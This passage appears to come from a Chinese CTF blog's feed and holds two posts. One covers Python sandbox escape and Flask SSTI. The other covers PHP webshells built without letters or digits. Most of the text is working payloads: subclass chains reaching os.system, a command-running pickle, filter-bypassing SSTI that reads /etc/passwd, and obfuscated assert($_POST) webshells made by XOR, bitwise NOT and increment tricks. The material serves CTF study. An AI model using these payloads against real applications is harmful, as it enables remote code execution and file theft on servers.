&lt;type &apos;object&apos;&gt;)</code></pre><p>通过文章最开始的介绍我们也可以通过多次使用 <code>__base__</code> 来找到基类 <code>object</code></p><pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__base__.__base__&lt;type &apos;object&apos;&gt;</code></pre><p>然后从基类向下回溯，使用 <code>__subclasses__</code></p><pre><code>&gt;&gt;&gt; &apos;&apos;.__class__.__mro__(&lt;type &apos;str&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;object&apos;&gt;)&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2]&lt;type &apos;object&apos;&gt;&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2].__subclasses__&lt;built-in method __subclasses__ of type object at 0x0000000061AE85E0&gt;&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2].__subclasses__()[&lt;type &apos;type&apos;&gt;, &lt;type &apos;weakref&apos;&gt;, &lt;type &apos;weakcallableproxy&apos;&gt;, &lt;type &apos;weakproxy&apos;&gt;, &lt;type &apos;int&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;bytearray&apos;&gt;, &lt;type &apos;list&apos;&gt;, &lt;type &apos;NoneType&apos;&gt;, &lt;type &apos;NotImplementedType&apos;&gt;, &lt;type &apos;traceback&apos;&gt;, &lt;type &apos;super&apos;&gt;, &lt;type &apos;xrange&apos;&gt;, &lt;type &apos;dict&apos;&gt;, &lt;type &apos;set&apos;&gt;, &lt;type &apos;slice&apos;&gt;, &lt;type &apos;staticmethod&apos;&gt;, &lt;type &apos;complex&apos;&gt;, &lt;type &apos;float&apos;&gt;, &lt;type &apos;buffer&apos;&gt;, &lt;type &apos;long&apos;&gt;, &lt;type &apos;frozenset&apos;&gt;, &lt;type &apos;property&apos;&gt;, &lt;type &apos;memoryview&apos;&gt;, &lt;type &apos;tuple&apos;&gt;, &lt;type &apos;enumerate&apos;&gt;, &lt;type &apos;reversed&apos;&gt;, &lt;type &apos;code&apos;&gt;, &lt;type &apos;frame&apos;&gt;, &lt;type &apos;builtin_function_or_method&apos;&gt;, &lt;type &apos;instancemethod&apos;&gt;, &lt;type &apos;function&apos;&gt;, &lt;type &apos;classobj&apos;&gt;, &lt;type &apos;dictproxy&apos;&gt;, &lt;type &apos;generator&apos;&gt;, &lt;type &apos;getset_descriptor&apos;&gt;, &lt;type &apos;wrapper_descriptor&apos;&gt;, &lt;type &apos;instance&apos;&gt;, &lt;type &apos;ellipsis&apos;&gt;, &lt;type &apos;member_descriptor&apos;&gt;, &lt;type &apos;file&apos;&gt;, &lt;type &apos;PyCapsule&apos;&gt;, &lt;type &apos;cell&apos;&gt;, &lt;type &apos;callable-iterator&apos;&gt;, &lt;type &apos;iterator&apos;&gt;, &lt;type &apos;sys.long_info&apos;&gt;, &lt;type &apos;sys.float_info&apos;&gt;, &lt;type &apos;EncodingMap&apos;&gt;, &lt;type &apos;fieldnameiterator&apos;&gt;, &lt;type &apos;formatteriterator&apos;&gt;, &lt;type &apos;sys.version_info&apos;&gt;, &lt;type &apos;sys.flags&apos;&gt;, &lt;type &apos;sys.getwindowsversion&apos;&gt;, &lt;type &apos;exceptions.BaseException&apos;&gt;, &lt;type &apos;module&apos;&gt;, &lt;type &apos;imp.NullImporter&apos;&gt;, &lt;type &apos;zipimport.zipimporter&apos;&gt;, &lt;type &apos;nt.stat_result&apos;&gt;, &lt;type &apos;nt.statvfs_result&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &lt;class &apos;_abcoll.Hashable&apos;&gt;, &lt;type &apos;classmethod&apos;&gt;, &lt;class &apos;_abcoll.Iterable&apos;&gt;, &lt;class &apos;_abcoll.Sized&apos;&gt;, &lt;class &apos;_abcoll.Container&apos;&gt;, &lt;class &apos;_abcoll.Callable&apos;&gt;, &lt;type &apos;dict_keys&apos;&gt;, &lt;type &apos;dict_items&apos;&gt;, &lt;type &apos;dict_values&apos;&gt;, &lt;class &apos;site._Printer&apos;&gt;, &lt;class &apos;site._Helper&apos;&gt;, &lt;type &apos;_sre.SRE_Pattern&apos;&gt;, &lt;type &apos;_sre.SRE_Match&apos;&gt;, &lt;type &apos;_sre.SRE_Scanner&apos;&gt;, &lt;class &apos;site.Quitter&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;, &lt;type &apos;operator.itemgetter&apos;&gt;, &lt;type &apos;operator.attrgetter&apos;&gt;, &lt;type &apos;operator.methodcaller&apos;&gt;, &lt;type &apos;functools.partial&apos;&gt;, &lt;type &apos;MultibyteCodec&apos;&gt;, &lt;type &apos;MultibyteIncrementalEncoder&apos;&gt;, &lt;type &apos;MultibyteIncrementalDecoder&apos;&gt;, &lt;type &apos;MultibyteStreamReader&apos;&gt;, &lt;type &apos;MultibyteStreamWriter&apos;&gt;, &lt;class &apos;string.Template&apos;&gt;, &lt;class &apos;string.Formatter&apos;&gt;, &lt;type &apos;itertools.combinations&apos;&gt;, &lt;type &apos;itertools.combinations_with_replacement&apos;&gt;, &lt;type &apos;itertools.cycle&apos;&gt;, &lt;type &apos;itertools.dropwhile&apos;&gt;, &lt;type &apos;itertools.takewhile&apos;&gt;, &lt;type &apos;itertools.islice&apos;&gt;, &lt;type &apos;itertools.starmap&apos;&gt;, &lt;type &apos;itertools.imap&apos;&gt;, &lt;type &apos;itertools.chain&apos;&gt;, &lt;type &apos;itertools.compress&apos;&gt;, &lt;type &apos;itertools.ifilter&apos;&gt;, &lt;type &apos;itertools.ifilterfalse&apos;&gt;, &lt;type &apos;itertools.count&apos;&gt;, &lt;type &apos;itertools.izip&apos;&gt;, &lt;type &apos;itertools.izip_longest&apos;&gt;, &lt;type &apos;itertools.permutations&apos;&gt;, &lt;type &apos;itertools.product&apos;&gt;, &lt;type &apos;itertools.repeat&apos;&gt;, &lt;type &apos;itertools.groupby&apos;&gt;, &lt;type &apos;itertools.tee_dataobject&apos;&gt;, &lt;type &apos;itertools.tee&apos;&gt;, &lt;type &apos;itertools._grouper&apos;&gt;, &lt;type &apos;collections.deque&apos;&gt;, &lt;type &apos;deque_iterator&apos;&gt;, &lt;type &apos;deque_reverse_iterator&apos;&gt;, &lt;type &apos;_thread._localdummy&apos;&gt;, &lt;type &apos;thread._local&apos;&gt;, &lt;type &apos;thread.lock&apos;&gt;, &lt;type &apos;_io._IOBase&apos;&gt;, &lt;type &apos;_io.IncrementalNewlineDecoder&apos;&gt;, &lt;type &apos;_hashlib.HASH&apos;&gt;, &lt;type &apos;_random.Random&apos;&gt;, &lt;type &apos;cStringIO.StringO&apos;&gt;, &lt;type &apos;cStringIO.StringI&apos;&gt;, &lt;type &apos;Struct&apos;&gt;]</code></pre><p>我们发现结果太多了，网上找到 bendawang 师傅的脚本来循环找一下</p><pre><code>#!/usr/bin/env python# encoding: utf-8cnt=0for item in [].__class__.__base__.__subclasses__():    try:        if &apos;os&apos; in item.__init__.__globals__:            print cnt,item        cnt+=1    except:        print &quot;error&quot;,cnt,item        cnt+=1        continue</code></pre><p>利用这个来找到 <code>os</code> 模块的入口</p><pre><code>#!/usr/bin/env python# encoding: utf-8cnt=0for item in &quot;&quot;.__class__.__mro__[-1].__subclasses__():    try:        cnt2=0        for i in item.__init__.__globals__:            if &apos;eval&apos; in item.__init__.__globals__[i]:                print cnt,item,cnt2,i            cnt2+=1        cnt+=1    except:        print &quot;error&quot;,cnt,item        cnt+=1        continue</code></pre><p>这个相当于更深入一层查找</p><p>存在的子模块可以通过 .index() 来进行查询，如果存在返回索引</p><pre><code>&apos;&apos;.__class__.__mro__[2].__subclasses__().index(file)</code></pre><p>2.x 版本中有一个 warnings </p><pre><code>&gt;&gt;&gt; import warnings&gt;&gt;&gt; warnings.osTraceback (most recent call last):  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;AttributeError: &apos;module&apos; object has no attribute &apos;os&apos;&gt;&gt;&gt; warnings.linecache&lt;module &apos;linecache&apos; from &apos;F:\python2.7\lib\linecache.pyc&apos;&gt;&gt;&gt;&gt; warnings.linecache.os&lt;module &apos;os&apos; from &apos;F:\python2.7\lib\os.pyc&apos;&gt;</code></pre><p>我们可以</p><pre><code>[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__[&apos;os&apos;].system(&apos;whoami&apos;)</code></pre><p>简单的给基类的所有模块编号</p><pre><code>for i in enumerate(&apos;&apos;.__class__.__mro__[-1].__subclasses__()): print i</code></pre><p>如何便捷的找到我们想要的入口</p><pre><code>[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == &apos;catch_warnings&apos;]</code></pre><h3 id="大佬们的payload"><a href="#大佬们的payload" class="headerlink" title="大佬们的payload"></a>大佬们的payload</h3><ol><li><code>&#39;&#39;.__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__[&#39;system&#39;](&#39;whoami&#39;) //3.x</code></li><li><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[29].__call__(eval, &#39;1+1&#39;)</code></li><li><code>[].__getattribute__(&#39;append&#39;).__class__.__call__(eval, &#39;1+1&#39;)</code></li><li><code>[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</code></li><li><code>[].__class__.__base__.__subclasses__()[76].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</code></li><li><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;_    _import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)</code></li><li><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;_    _import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)</code></li><li><code>&quot;&quot;.__class__.__mro__[-1].__subclasses__()[40](filename).read()</code></li><li><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__(&#39;func_globals&#39;)[&#39;linecache&#39;].__dict__[&#39;sys&#39;].modules[&#39;os&#39;].popen(&#39;ls&#39;).read()</code></li></ol><h3 id="过滤中括号"><a href="#过滤中括号" class="headerlink" title="过滤中括号"></a>过滤中括号</h3><p>如果碰到过滤 <code>[ ]</code> ，我们可以将 <code>[]</code> 的功能用 <code>pop</code> 、 <code>__getitem__</code>代替（实际上 <code>a[0]</code> 在内部就是调用了 <code>a.__getitem__(0)</code> ），<code>pop()</code> 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值</p><pre><code>&apos;&apos;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.get(&apos;linecache&apos;).os.popen(&apos;whoami&apos;).read()</code></pre><h3 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h3><p>requests.args 是 flask 中的一个属性，为返回请求的参数，这里把 path 作为变量名将后面的路径传进来，来绕过引号</p><pre><code>{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()}}&amp;path=/etc/passwd</code></pre><h3 id="过滤双下划线"><a href="#过滤双下划线" class="headerlink" title="过滤双下划线"></a>过滤双下划线</h3><p>同样利用  requests.args 属性</p><pre><code>{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</code></pre><h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><p>除了编码，我们还可以通过字符串拼接</p><p><code>__getattribute__</code> 使用实例访问属性时,调用该方法</p><pre><code>{{[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40]("/etc/passwd").read()}}</code></pre><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><ol><li>func_globals</li></ol><p>返回包含函数全局变量的字典的引用-定义函数的模块的全局命名空间</p><ol start="2"><li><strong>getattribute</strong></li></ol><p>被调用无条件地实现类的实例的属性访问</p><pre><code>object. getattribute(self, name)1）self 必需的。类的实例，在调用时自动传递。2）name 必需的。属性的名称。</code></pre><ol start="3"><li><strong>subclasses</strong>()[]</li></ol><p>获取子类</p><ol start="4"><li>getattr</li></ol><p>返回对象的命名属性的值</p><pre><code>getattr(object,name) &lt;=&gt; object.name&gt;&gt;&gt; class A():...     bar =1...&gt;&gt;&gt; a = A()&gt;&gt;&gt; getattr(a,&apos;bar&apos;)1</code></pre><ol start="5"><li><strong>name</strong></li></ol><p>使用 sys.modules[<strong>name</strong>] 获得模块的引用</p><ol start="6"><li><p>timeit</p><p> timeit(命令，number=1)</p><p> import timeit<br> timeit.timeit(“<strong>import</strong>(‘os’).system(‘dir’)”,number=1) </p></li><li><p>platform</p></li></ol><p>模块和平台有关，主要是返回平台的一些信息</p><pre><code>print platform.popen(&apos;dir&apos;,mode=&apos;r&apos;,bufsize= -1).read()</code></pre><ol start="8"><li><strong>globals</strong></li></ol><p>常与 <code>__init__</code> 配合使用，<code>__init__</code> 一般跟在类的后面。相当于实例化这个类</p><pre><code>[].__class__.__base__.__subclasses__()[71].__init__.__globals__[&apos;os&apos;].system(&apos;ls&apos;)</code></pre><ol start="9"><li><strong>call</strong></li></ol><p>使实例能够像函数一样被调用 <code>x.call() &lt;=&gt; x()</code></p><ol start="10"><li>pickle</li></ol><p>将对象储存在字符串对象中，实现对象的持久化</p><p>序列化：</p><pre><code>import pickletest=(&apos;this is a test&apos;,3.14,[1,2,3,&quot;hh&quot;])p=pickle.dumps(test)</code></pre><p>反序列化：</p><pre><code>n=pickle.loads(p)</code></pre><p>我们可以加载命令：</p><pre><code>pickle.loads(b&quot;cos\nsystem\n(S&apos;ls&apos;\ntR.&quot;)</code></pre><ol start="11"><li><p>os/subprocess/commands</p><p>os.system(‘ipconfig’)<br>os.popen(‘ipconfig’)<br>commands.getoutput(‘ipconfig’)<br>commands.getstatusoutput(‘ifconfig’)<br>subrocess.call([‘ipconfig’],shell=true)</p></li><li><p>eval/exec/execfile</p><p>eval() 执行 python 表达式执行的结果</p><p>exec() 动态执行 python 代码，可以执行复杂的 python 代码，eval 只能计算一个表达式</p><p>execfile() 执行一个文件的内容，文件是将被解析为 python 序列的类似模块的文件</p></li></ol><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote><p><a href="https://www.cnblogs.com/hester/p/4694499.html" target="_blank" rel="noopener">https://www.cnblogs.com/hester/p/4694499.html</a><br><a href="https://www.restran.net/2015/10/22/how-python-code-run/" target="_blank" rel="noopener">https://www.restran.net/2015/10/22/how-python-code-run/</a><br><a href="https://www.freebuf.com/articles/system/203208.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/203208.html</a><br><a href="https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/#21-os-subprocess-commands" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/#21-os-subprocess-commands</a><br><a href="https://www.zhihu.com/question/38791962?sort=created" target="_blank" rel="noopener">https://www.zhihu.com/question/38791962?sort=created</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>特殊的webshell</title>
      <link href="/2019/09/27/%E7%89%B9%E6%AE%8A%E7%9A%84webshell/"/>
      <url>/2019/09/27/%E7%89%B9%E6%AE%8A%E7%9A%84webshell/</url>
      
        <content type="html"><![CDATA[<h1 id="特殊的webshell"><a href="#特殊的webshell" class="headerlink" title="特殊的webshell"></a>特殊的webshell</h1><p>实验环境 ：<code>php 5.45+nts+apache</code></p><blockquote><p>php5中assert是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这样的方法来动态执行任意代码。</p><p>但 php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。</p></blockquote><h2 id="不包含数字字母"><a href="#不包含数字字母" class="headerlink" title="不包含数字字母"></a>不包含数字字母</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/[a-z0-9]/is'</span>,$_GET[<span class="string">'shell'</span>])) &#123;</span><br><span class="line"> <span class="keyword">eval</span>($_GET[<span class="string">'shell'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><p>异或是对字符的 <code>ascii</code>码进行逐位异或以后得到一个异或结果<code>ascii</code>码的字符。</p><p>第一种方法就是这样来绕过数字字母的检测。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a=urldecode(<span class="string">'%01'</span>); <span class="comment">//ascii 0x01</span></span><br><span class="line">$b=urldecode(<span class="string">'`'</span>);   <span class="comment">//ascii 96</span></span><br><span class="line"><span class="keyword">echo</span> $a^$b; <span class="comment">//a</span></span><br><span class="line"><span class="number">96</span>:  <span class="number">0110</span> <span class="number">0000</span></span><br><span class="line">%<span class="number">01</span>: <span class="number">0000</span> <span class="number">0001</span> <span class="comment">//相当于ascii+1</span></span><br></pre></td></tr></table></figure><p>我们统一选取  ‘`’  作为我们异或的起点，因为他的 ascii 是96。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$_=(<span class="string">'%01'</span>^<span class="string">'`'</span>).(<span class="string">'%13'</span>^<span class="string">'`'</span>).(<span class="string">'%13'</span>^<span class="string">'`'</span>).(<span class="string">'%05'</span>^<span class="string">'`'</span>).(<span class="string">'%12'</span>^<span class="string">'`'</span>).(<span class="string">'%14'</span>^<span class="string">'`'</span>);</span><br><span class="line">$__=<span class="string">'_'</span>.(<span class="string">'%0D'</span>^<span class="string">']'</span>).(<span class="string">'%2F'</span>^<span class="string">'`'</span>).(<span class="string">'%0E'</span>^<span class="string">']'</span>).(<span class="string">'%09'</span>^<span class="string">']'</span>); <span class="comment">// $__='_POST';</span></span><br><span class="line">$___=$$__;</span><br><span class="line">$_($___[_]); <span class="comment">// assert($_POST[_]);</span></span><br></pre></td></tr></table></figure><p>在如下过滤中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">@highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/[a-z0-9]/is'</span>,$_GET[<span class="string">'shell'</span>])) &#123;</span><br><span class="line"> <span class="keyword">eval</span>($_GET[<span class="string">'shell'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们 <code>POST : _=phpinfo();</code> 即可成功执行</p><h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><p>通过取反将汉字编码中的编码取出来进行取反</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> ((<span class="string">'&gt;'</span>&gt;<span class="string">'&lt;'</span>)+(<span class="string">'&gt;'</span>&gt;<span class="string">'&lt;'</span>)).<span class="string">' '</span>;<span class="comment">//利用弱类型的特性</span></span><br><span class="line">$__=(<span class="string">'&gt;'</span>&gt;<span class="string">'&lt;'</span>)+(<span class="string">'&gt;'</span>&gt;<span class="string">'&lt;'</span>);</span><br><span class="line">$_=$__/$__;</span><br><span class="line"><span class="keyword">echo</span> $_;</span><br><span class="line"><span class="keyword">echo</span> ~(<span class="string">'和'</span>&#123;<span class="number">2</span>&#125;);          <span class="comment">//s</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$__=(<span class="string">'&gt;'</span>&gt;<span class="string">'&lt;'</span>)+(<span class="string">'&gt;'</span>&gt;<span class="string">'&lt;'</span>); <span class="comment">//2</span></span><br><span class="line">$_=$__/$__; <span class="comment">//1</span></span><br><span class="line"></span><br><span class="line">$____=<span class="string">''</span>; <span class="comment">//assert</span></span><br><span class="line">$___=<span class="string">"瞰"</span>;$____.=~($___&#123;$_&#125;); <span class="keyword">echo</span> $____.<span class="string">"\r\n"</span>;<span class="comment">//a</span></span><br><span class="line">$___=<span class="string">"和"</span>;$____.=~($___&#123;$__&#125;); <span class="keyword">echo</span> $____.<span class="string">"\r\n"</span>; <span class="comment">//s</span></span><br><span class="line">$___=<span class="string">"和"</span>;$____.=~($___&#123;$__&#125;);</span><br><span class="line">$___=<span class="string">"的"</span>;$____.=~($___&#123;$_&#125;);</span><br><span class="line">$___=<span class="string">"半"</span>;$____.=~($___&#123;$_&#125;);</span><br><span class="line">$___=<span class="string">"始"</span>;$____.=~($___&#123;$__&#125;);</span><br><span class="line"></span><br><span class="line">$_____=<span class="string">'_'</span>;<span class="comment">//_POST</span></span><br><span class="line">$___=<span class="string">"俯"</span>;$_____.=~($___&#123;$__&#125;);</span><br><span class="line">$___=<span class="string">"瞰"</span>;$_____.=~($___&#123;$__&#125;);</span><br><span class="line">$___=<span class="string">"次"</span>;$_____.=~($___&#123;$_&#125;);</span><br><span class="line">$___=<span class="string">"站"</span>;$_____.=~($___&#123;$_&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$_=$$_____; <span class="comment">//$_POSTT</span></span><br><span class="line"></span><br><span class="line">$____($_[$__]);<span class="comment">//assert(_POST[2])</span></span><br></pre></td></tr></table></figure><h3 id="字符递增"><a href="#字符递增" class="headerlink" title="字符递增"></a>字符递增</h3><blockquote><p>在处理字符变量的算数运算时，PHP 沿袭了 Perl 的习惯，而非 C 的。例如，在 Perl 中 $a = ‘Z’; $a++; 将把 $a 变成’AA’，而在 C 中，a = ‘Z’; a++; 将把 a 变成 ‘[‘（’Z’ 的 ASCII 值是 90，’[‘ 的 ASCII 值是 91）。注意字符变量只能递增，不能递减，并且只支持纯字母（a-z 和 A-Z）。递增／递减其他字符变量则无效，原字符串没有变化。 </p></blockquote><pre><code>echo &quot;&lt;h3&gt;Postincrement&lt;/h3&gt;&quot;;$a = 5;echo &quot;Should be 5: &quot; . $a++ . &quot;&lt;br /&gt;\n&quot;; //5echo &quot;Should be 6: &quot; . $a . &quot;&lt;br /&gt;\n&quot;;   //6$c = &apos;b&apos;;echo $c++.&quot;&lt;br /&gt;\n&quot;;                     //becho $c.&quot;\n&quot;;                               //c?&gt;</code></pre><p>我们只要拿到一个变量值为 <code>a</code> ，通过自增操作就可以获得 <code>a-z</code> 中所有字符。</p><p>php中如果强制链接数组和字符串的话，数组会被转换成字符串，值为 <code>Arrary</code> </p><pre><code>echo &apos;&apos;.[];   //Array</code></pre><p>我们取第一个字符就可以得到 <code>A</code> 了。</p><p>payload:</p><pre><code>&lt;?php$_=[];$_=@&quot;$_&quot;; // $_=&apos;Array&apos;;$_=$_[&apos;!&apos;==&apos;@&apos;]; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____=&apos;_&apos;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); // ASSERT($_POST[_]);</code></pre><p>但是一直没有成功</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">'$_=[];$_=@"$_";'</span></span><br><span class="line">b = <span class="string">"$_=$_['!'=='@'];"</span></span><br><span class="line">c = <span class="string">'$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;'</span></span><br><span class="line">d = <span class="string">'$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++; $___.=$__;$__=$_;$__++;'</span></span><br><span class="line">e = <span class="string">'$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;'</span></span><br><span class="line">f = <span class="string">'$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;'</span></span><br><span class="line">g = <span class="string">"$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;"</span></span><br><span class="line">h = <span class="string">'$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$_=$$____;$___($_[_]);'</span></span><br><span class="line"><span class="keyword">print</span> (a+b+c+d+e+f+g+h).replace(<span class="string">"$"</span>,<span class="string">"%24"</span>).replace(<span class="string">"="</span>,<span class="string">"%3d"</span>).replace(<span class="string">";"</span>,<span class="string">"%3b"</span>).replace(<span class="string">"@"</span>,<span class="string">"%40"</span>).replace(<span class="string">"+"</span>,<span class="string">"%20"</span>).replace(<span class="string">"["</span>,<span class="string">"%5b"</span>).replace(<span class="string">"]"</span>,<span class="string">"%5d"</span>).replace(<span class="string">"'"</span>,<span class="string">"%27"</span>).replace(<span class="string">'"'</span>,<span class="string">"%22"</span>).replace(<span class="string">"!"</span>,<span class="string">"%21"</span>).replace(<span class="string">"("</span>,<span class="string">"%28"</span>).replace(<span class="string">")"</span>,<span class="string">"%29"</span>).replace(<span class="string">"."</span>,<span class="string">'%2e'</span>)</span><br></pre></td></tr></table></figure><h2 id="限制长度"><a href="#限制长度" class="headerlink" title="限制长度"></a>限制长度</h2><p>PHP可以将字符串当作函数来处理：</p><pre><code>function B(){    echo &quot;hello world!&quot;;}$_++;           //1echo $_;$__ = &apos;?&apos;^&apos;}&apos;; //Becho $__;$__();</code></pre><p>题目：</p><pre><code>&lt;?phpinclude &apos;flag.php&apos;;if(isset($_GET[&apos;code&apos;])){    $code = $_GET[&apos;code&apos;];    if(strlen($code)&gt;40){        die(&quot;Long.&quot;);    }    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)){        die(&quot;NO.&quot;);    }    @eval($code);}else{    highlight_file(__FILE__);}//$hint =  &quot;php function getFlag() to get flag&quot;;?&gt;</code></pre><p>限制长度为40，之前的异或不行了。我们要利用PHP允许动态执行函数的特点，构造一个 